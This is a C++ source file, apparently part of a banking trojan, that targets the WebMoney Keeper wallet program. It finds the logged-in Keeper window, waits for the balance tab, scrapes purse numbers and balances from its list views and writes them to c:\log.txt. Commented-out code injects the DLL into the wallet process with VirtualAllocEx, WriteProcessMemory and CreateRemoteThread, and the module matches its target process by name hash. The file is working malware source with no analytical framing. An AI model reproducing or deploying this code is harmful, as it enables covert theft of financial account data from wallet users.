// web_money_dll.cpp : Defines the entry point for the DLL application.
//


#include "windows.h"
#include "commctrl.h"
#include "tlhelp32.h"
#include "BotUtils.h"
#include "Memory.h"
#include "GetApi.h"
#include "Utils.h"
#define pTabCtrl_GetCurSel(hwnd, i) \
    (int)pSendMessageA((hwnd), TCM_GETCURSEL, (WPARAM)(i), 0)

#define pListView_SetItemText(hwndLV, i, iSubItem_, pszText_) \
{ LV_ITEM _macro_lvi;\
  _macro_lvi.iSubItem = (iSubItem_);\
  _macro_lvi.pszText = (pszText_);\
  pSendMessageA((hwndLV), LVM_SETITEMTEXT, (WPARAM)(i), (LPARAM)(LV_ITEM *)&_macro_lvi);\
}
#define pListView_GetItemText(hwndLV, i, iSubItem_, pszText_, cchTextMax_) \
{ LV_ITEM _macro_lvi;\
  _macro_lvi.iSubItem = (iSubItem_);\
  _macro_lvi.cchTextMax = (cchTextMax_);\
  _macro_lvi.pszText = (pszText_);\
  pSendMessageA((hwndLV), LVM_GETITEMTEXT, (WPARAM)(i), (LPARAM)(LV_ITEM *)&_macro_lvi);\
}

#define PROCESS_SUSPEND_RESUME  0x0800

void ClearLog();


void Log( const CHAR *text);

extern"C" void  __declspec(dllexport) Inject(DWORD pid);
extern"C" void check(HWND hwnd);

HMODULE hDll;

void GetWebmoneyBalans(HWND hwnd,char* buf_str ){
	int count = (int)pSendMessageA(hwnd,LVM_GETITEMCOUNT,0,0);//ListView_GetItemCount(hwnd);
	*buf_str = 0;
	while(count--){
	  char buf[256];
	//  pListView_SetItemText(hwnd,count,0,"0");
	//  pListView_SetItemText(hwnd,count,1,"1");
	  
	  pListView_GetItemText(hwnd,count,0,(char*)buf,sizeof(buf));
		plstrcatA(buf_str,buf);		 plstrcatA(buf_str, " ");	
	  pListView_GetItemText(hwnd,count,1,(char*)buf,sizeof(buf));
		plstrcatA(buf_str,buf);		 plstrcatA(buf_str, " ");		
	  pListView_GetItemText(hwnd,count,2,(char*)buf,sizeof(buf));
		plstrcatA(buf_str,buf);		 plstrcatA(buf_str, " ");			 
	  pListView_GetItemText(hwnd,count,3,(char*)buf,sizeof(buf));
		plstrcatA(buf_str,buf);	  plstrcatA(buf_str, "\r\n");  	
	};

};

void check(HWND hwnd)
{
char*str_list = (char*)MemAlloc(16*1024);
*str_list = 0;
	GetWebmoneyBalans(hwnd,str_list);
	Log(str_list);
MemFree(str_list);
};



BOOL CALLBACK EnumWindowsProc(          HWND hwnd_WebMoney,
    LPARAM lParam
)
{	
	HWND hwnd = hwnd_WebMoney;
	DWORD pid = 0;
	BOOL IsLogonWindow = TRUE;
	BOOL IsMoneyWindow = FALSE;
	pGetWindowThreadProcessId(hwnd_WebMoney,&pid);
 if (1/*(DWORD)pGetCurrentProcessId() ==  pid*/){
		HWND temp = hwnd;
		int (WINAPI*pStrStrA)(char*,char*) = (int(WINAPI*)(char*,char*))pGetProcAddress(hDll,"StrStrA");
	 	char buf[256];
		pGetWindowTextA(hwnd,buf,sizeof(buf)-1);
		if (!pStrStrA(buf,"WebMoney"))
			return TRUE;
while(IsLogonWindow){
	IsLogonWindow = FALSE;
	do{	
		pGetWindowTextA(hwnd,buf,sizeof(buf)-1);
		if (pStrStrA(buf,"WebMoney Keeper Classic")){
			IsLogonWindow = TRUE;
			break;
		};
		hwnd = (HWND)pFindWindowExA(NULL,hwnd,NULL,NULL);
	}while(hwnd);
	hwnd=temp;
};
if (IsLogonWindow)
		return TRUE;
IsLogonWindow = FALSE;
	do{	
		pGetWindowTextA(hwnd,buf,sizeof(buf)-1);
		if (pStrStrA(buf,"WebMoney Keeper") && pStrStrA(buf,"WMID")){
			IsLogonWindow = TRUE;
			break;
		};
		hwnd = (HWND)pFindWindowExA(NULL,hwnd,NULL,NULL);
	}while(hwnd);
if (!IsLogonWindow)
		return TRUE;
pSleep(10000);
hwnd = (HWND)pFindWindowExA(hwnd,0,"SysTabControl32",NULL);
while( 1 != pTabCtrl_GetCurSel(hwnd,1))
	pSleep(100);
pSleep(1000);
IsMoneyWindow = TRUE;
hwnd = 0;
	do{	
		hwnd = (HWND)pFindWindowExA(temp,hwnd,"SysListView32",NULL);
		check(hwnd);
	}while(hwnd);
 *((PDWORD)lParam) = 1;
 };

	return TRUE;
};



DWORD WINAPI ThreadProc(PVOID p)
{
	DWORD IsExit = 0;
	Sleep(3000);
hDll  = (HMODULE)pLoadLibraryA("shlwapi.dll");
	do{	
		pEnumWindows(EnumWindowsProc,&IsExit); 
	} while(!IsExit);
pFreeLibrary(hDll);
hDll = 0;
	return 0;
};

void HookWebMoney()
{
	DWORD id;
	HANDLE hThread ;
		
	hThread = StartThread(ThreadProc,NULL);
	pCloseHandle(hThread);
};

bool IsWebMoney()
{
        WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );
        if ( ModulePath == NULL )
        {
                return false;
        }
	
        pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );

        DWORD dwProcessHash = GetNameHash( ModulePath );
		if (dwProcessHash ==   0xF8083E3B) {
               MemFree( ModulePath );
                return true;
        }
        MemFree( ModulePath );
        return false;
};

/*
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	DWORD id;
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		DWORD id;
		CreateThread(NULL,0,ThreadProc,NULL,0,&id);
	};
    return TRUE;
};
*/

void Log(const CHAR *text)
{
	HANDLE hFile ;
	DWORD s;
	hFile = pCreateFileA("c:\\log.txt",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if (hFile == INVALID_HANDLE_VALUE)
		return;
	pSetFilePointer(hFile,0,0,FILE_END);
	pWriteFile(hFile,text,(int)plstrlenA(text)*sizeof(CHAR),&s,NULL);
	pCloseHandle(hFile);
};
void ClearLog()
{
	HANDLE hFile;
		hFile = pCreateFileA("c:\\log.txt",GENERIC_READ|GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if (hFile == INVALID_HANDLE_VALUE)
		return;

	pCloseHandle(hFile);
};


/*
void Inject(DWORD pid)
{
	char buf0[256],buf1[256];
	HANDLE hWebMoney = OpenProcess(PROCESS_VM_OPERATION |PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION |PROCESS_SUSPEND_RESUME |PROCESS_CREATE_THREAD,FALSE,pid);
	PVOID p;
	DWORD s;
	if (!hWebMoney){
		GetLastError();
		return ;
	};
	p=VirtualAllocEx(hWebMoney,NULL,4096,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
	if (!p){
				GetLastError();
		return ;
	};
	GetCurrentDirectory(255,buf1);
	strcpy(buf0,buf1);
	lstrcat(buf0,"\\web_money_dll.dll");
	WriteProcessMemory(hWebMoney,p,buf0,strlen(buf0)+1,&s);
	CreateRemoteThread(hWebMoney,NULL,0,(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32"),"LoadLibraryA"),p,0,&s);
	CloseHandle(hWebMoney);
};
*/


